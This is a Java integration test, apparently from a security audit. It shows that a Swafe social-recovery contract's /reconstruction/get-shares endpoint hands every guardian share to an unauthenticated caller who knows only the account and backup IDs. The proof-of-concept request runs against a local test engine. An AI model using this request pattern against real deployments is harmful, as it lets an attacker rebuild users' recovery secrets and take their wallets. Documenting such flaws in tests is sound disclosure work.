package com.partisia.blockchain.contract;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assertions.assertEquals;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.partisiablockchain.BlockchainAddress;
import com.partisiablockchain.container.execution.protocol.HttpRequestData;
import com.partisiablockchain.container.execution.protocol.HttpResponseData;
import com.partisiablockchain.crypto.KeyPair;
import com.partisiablockchain.language.abicodegen.SwafeContract;
import com.partisiablockchain.language.junit.ContractBytes;
import com.partisiablockchain.language.junit.ContractTest;
import com.partisiablockchain.language.junit.JunitContractTest;
import com.partisiablockchain.language.testenvironment.executionengine.TestExecutionEngine;
import java.io.IOException;
import java.math.BigInteger;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * Integration test that demonstrates Threat Component #4: the reconstruction/get-shares HTTP
 * endpoint returns every uploaded guardian share to any caller that knows the account and backup ID,
 * bypassing the guardian threshold assumptions.
 */
public final class TC4UnauthorizedGuardianShareDisclosureIT extends JunitContractTest {

  private static final ContractBytes CONTRACT_BYTES =
      ContractBytes.fromPbcFile(
          Path.of("../target/wasm32-unknown-unknown/release/swafe_contract.pbc"));

  private static final int NUM_NODES = 3;
  private final String[] nodeNames = generateNodeNames(NUM_NODES);
  private final KeyPair[] engineKeys = generateEngineKeys(NUM_NODES);

  private static String[] generateNodeNames(int numNodes) {
    String[] names = new String[numNodes];
    for (int i = 0; i < numNodes; i++) {
      names[i] = "node" + (i + 1);
    }
    return names;
  }

  private static KeyPair[] generateEngineKeys(int numNodes) {
    KeyPair[] keys = new KeyPair[numNodes];
    for (int i = 0; i < numNodes; i++) {
      keys[i] = new KeyPair(BigInteger.valueOf(100 + i));
    }
    return keys;
  }

  @ContractTest
  void should_leak_guardian_shares_to_unauthenticated_attackers_under_tc4() throws IOException, InterruptedException {
    Path resourcesDir = Path.of("src/test/resources");
    Files.createDirectories(resourcesDir);

    KeyManager keyManager = new KeyManager();
    keyManager.generateNodeKeypairs(NUM_NODES);

    BlockchainAddress deployer = blockchain.newAccount(2);

    TestExecutionEngine[] testEngines = new TestExecutionEngine[NUM_NODES];
    for (int i = 0; i < NUM_NODES; i++) {
      testEngines[i] = blockchain.addExecutionEngine(p -> true, engineKeys[i]);
    }

    BlockchainAddress[] nodeAddresses = new BlockchainAddress[NUM_NODES];
    for (int i = 0; i < NUM_NODES; i++) {
      nodeAddresses[i] = blockchain.newAccount(10 + i);
    }

    List<SwafeContract.OffchainNodeSetup> vdrfNodes =
        VdrfSetup.generateVdrfSetup(nodeNames, testEngines, nodeAddresses);

    keyManager.generateKeypair("swafe");
    String swafePublicKeyStr = keyManager.getPublicKey("swafe");
    String vdrfPublicKeyStr = VdrfSetup.getVdrfPublicKey();

    BlockchainAddress swafeAddress =
        blockchain.deployContract(
            deployer, CONTRACT_BYTES, SwafeContract.initialize(vdrfNodes, swafePublicKeyStr, vdrfPublicKeyStr));
    SwafeContract swafeContract = new SwafeContract(getStateClient(), swafeAddress);

    VdrfSetup.initializeVdrfNodes(swafeAddress);

    // Owner and guardian accounts that participate in the social-recovery backup workflow.
    AccountManager.AccountData ownerAccount =
        AccountManager.generateAccountAllocation(blockchain, deployer, swafeAddress);

    List<AccountManager.AccountData> guardianAccounts = new ArrayList<>();
    for (int i = 0; i < 3; i++) {
      guardianAccounts.add(AccountManager.generateAccountAllocation(blockchain, deployer, swafeAddress));
    }

    int threshold = 2;
    BackupWorkflow.BackupResult backupResult =
            BackupWorkflow.createAndUploadBackup(
                ownerAccount,
                guardianAccounts,
                threshold,
                "wallet seed phrase",
                "TC4 backup",
                "backup for threat-component-4 test",
                blockchain,
                deployer,
                swafeAddress);

    List<BackupWorkflow.GuardianShare> uploadedShares = new ArrayList<>();
    for (AccountManager.AccountData guardianAccount : guardianAccounts) {
      BackupWorkflow.GuardianSecretShare secretShare =
          BackupWorkflow.guardianDecryptShare(guardianAccount, backupResult);
      BackupWorkflow.GuardianShare guardianShare =
          BackupWorkflow.createGuardianShare(ownerAccount, secretShare, backupResult);
      uploadedShares.add(guardianShare);

      HttpResponseData uploadResponse =
          BackupWorkflow.uploadGuardianShareToContract(
              guardianShare,
              backupResult.accountIdStr,
              backupResult.backupIdStr,
              swafeAddress,
              swafeContract);
      assertEquals(200, uploadResponse.statusCode(), "Guardian share upload should succeed");
    }

    // Attacker crafts the same JSON request that the legitimate CLI uses but knows only IDs.
    Path attackerRequestPath = Files.createTempFile("tc1_attacker_get_shares", ".json");
    try {
      List<String> command =
          CliHelper.buildCommand(
              "create-get-guardian-shares-request",
              "--account-id",
              backupResult.accountIdStr,
              "--backup-id",
              backupResult.backupIdStr,
              "--output",
              attackerRequestPath.toString());
      CliHelper.runCommand(command, "Malicious actor crafting /reconstruction/get-shares request");
    } finally {
      // command writes to attackerRequestPath; deletion happens later
    }

    String attackerBody = Files.readString(attackerRequestPath);
    Files.deleteIfExists(attackerRequestPath);

    TestExecutionEngine attackerEngine =
        blockchain.addExecutionEngine(addr -> addr.equals(swafeAddress), new KeyPair(BigInteger.valueOf(9999L)));
    HttpRequestData attackerRequest =
        new HttpRequestData(
            "POST",
            "/reconstruction/get-shares",
            Map.of("Content-Type", List.of("application/json")),
            attackerBody);

    HttpResponseData attackerResponse = attackerEngine.makeHttpRequest(swafeAddress, attackerRequest).response();
    assertEquals(
        200,
        attackerResponse.statusCode(),
        "Attacker without any recovery secrets unexpectedly receives guardian shares");

    ObjectMapper mapper = new ObjectMapper();
    JsonNode sharesNode = mapper.readTree(attackerResponse.bodyAsText()).get("shares");
    assertEquals(uploadedShares.size(), sharesNode.size(), "All shares leaked to the attacker");

    List<String> leakedShares = new ArrayList<>();
    for (JsonNode shareNode : sharesNode) {
      leakedShares.add(shareNode.asText());
    }

    List<String> expectedShares = new ArrayList<>();
    for (BackupWorkflow.GuardianShare share : uploadedShares) {
      expectedShares.add(share.shareStr);
    }

    assertThat(leakedShares).containsExactlyInAnyOrderElementsOf(expectedShares);
  }
}
